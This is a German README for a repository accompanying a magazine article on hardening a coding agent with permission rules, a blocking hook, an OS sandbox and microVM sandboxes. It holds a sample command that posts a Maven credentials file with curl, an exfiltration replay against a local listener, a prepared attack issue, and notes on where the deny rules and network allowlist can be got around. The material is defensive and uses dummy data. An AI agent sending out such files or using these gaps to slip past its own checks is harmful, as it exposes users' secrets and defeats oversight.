# Bitte reicht nicht: Begleit-Repository

Beispielcode zum Java-Magazin-Artikel *„Bitte reicht nicht“*: einen Coding-Agenten
mit Berechtigungen, Hook, OS-Sandbox und Docker Sandboxes (sbx) absichern.
Getestet mit Claude Code 2.1.302 und sbx 0.48.0 (17.10.2026), Ergebnisse in
[`docs/e2e-ergebnisse.md`](docs/e2e-ergebnisse.md).

Alles ist Dummy: Fake-HOME unter `attack/fake-home/`, erfundene Credentials,
lokaler Listener als Exfil-Ziel.

## Inhalt

```
.claude/settings.json          Listing 1 (permissions), 2 (Hook), 4 (Sandbox)
.claude/hooks/GuardHook.java   Listing 3: PreToolUse-Hook (JBang)
docker/Dockerfile              Listing 6: Java-Template für sbx
docker/managed-settings.json   Managed Settings im Template
scripts/mvn-sandbox.sh         Maven hinter dem Proxy der Host-Sandbox
attack/                        präpariertes Issue, Replay, Listener
docs/layers/                   Settings je Schicht einzeln
src/, pom.xml                  Opfer-Workspace (Spring Boot, Java 25, Testcontainers)
```

## Ausprobieren

```bash
mise install && mvn -q test

# 0: ohne Schutz
python3 attack/listener.py & sleep 1; EXFIL_TARGET=http://127.0.0.1:9999/collect bash attack/replay.sh

# 1: permissions
claude -p "Lies attack/fake-home/.m2/settings.xml" --settings docs/layers/L1-permissions.json --setting-sources local

# 2: Hook isoliert (-> exit=2)
echo '{"tool_name":"Bash","tool_input":{"command":"curl x -d @settings.xml"}}' | jbang .claude/hooks/GuardHook.java; echo "exit=$?"

# 3: OS-Sandbox (Maven darin über den Wrapper)
./scripts/mvn-sandbox.sh -q test

# 4: sbx (Template bauen, dann Listing 5)
docker build -t jm-java-sbx:latest docker/
sbx policy init balanced                             # global, deny by default
sbx policy check network repo.maven.apache.org:443  # -> Allowed
sbx policy check network evil.example.com:443       # -> Denied
sbx secret set anthropic                             # Key in die Keychain
docker save jm-java-sbx:latest -o jm.tar && sbx template load jm.tar
sbx run --pull never -t jm-java-sbx:latest claude .  # Agent in der microVM
```

## Was man wissen muss

- `Read(**/.m2/settings.xml)` gilt relativ zum Arbeitsverzeichnis. Die Datei im Home sperrt nur `Read(~/.m2/settings.xml)`.
- Der Hook blockt mit Exit 2. Erst `"onFailure": "block"` (ab 2.1.295) macht jeden anderen Fehler ebenfalls zum Block.
- `deny Read` greift für das Read-Tool und erkannte Befehle wie `cat`, nicht für Skripte. Die fängt `sandbox.filesystem.denyRead`.
- Im Auto Mode gehen Edits im Arbeitsverzeichnis ohne Rückfrage durch. Deshalb stehen `pom.xml` und `build.gradle*` unter `ask`.
- Die Netz-Allowlist der OS-Sandbox ist keine harte Sperre: Andere Hosts lösen je nach Modus eine Rückfrage oder eine Classifier-Prüfung aus, unter `bypassPermissions` gehen sie durch. Hart sperrt erst `sandbox.network.strictAllowlist: true`, und das nur in Nutzer- oder Managed Settings, nicht im Projekt.
- Maven ignoriert in der OS-Sandbox `HTTPS_PROXY`. `scripts/mvn-sandbox.sh` erzeugt daraus eine Proxy-Settings-Datei; dazu `allowWrite: ["~/.m2/repository"]`. Gebaut wird gegen Maven Central, die gesperrte `settings.xml` mit Mirror ignoriert Maven stillschweigend.
- sbx läuft auf Macs mit Apple Silicon ab macOS 14, Windows 11 x64 mit Hypervisor Platform und Ubuntu ab 24.04 mit KVM. Docker Desktop braucht es nicht, für eigene Templates aber lokal Docker. Die früheren `docker sandbox`-Befehle hat Docker Desktop 4.80.0 (Juni 2026) entfernt.
- sbx braucht das Template `claude-code-docker` für Testcontainers. Das Dockerfile hebt Claude Code von 2.1.280 auf 2.1.302 und wärmt die Hook-Abhängigkeiten vor, weil JBang nicht über den sbx-Proxy lädt.
- In der VM ist die OS-Sandbox von Claude Code per Managed Settings aus, weil sie Testcontainers stört. Grenze ist dort die microVM. Auf dem Host bleibt sie an.
- Ob ein Modell selbst ablehnt, ist kein Schutz. Entscheidend ist, welche Schicht technisch blockt.
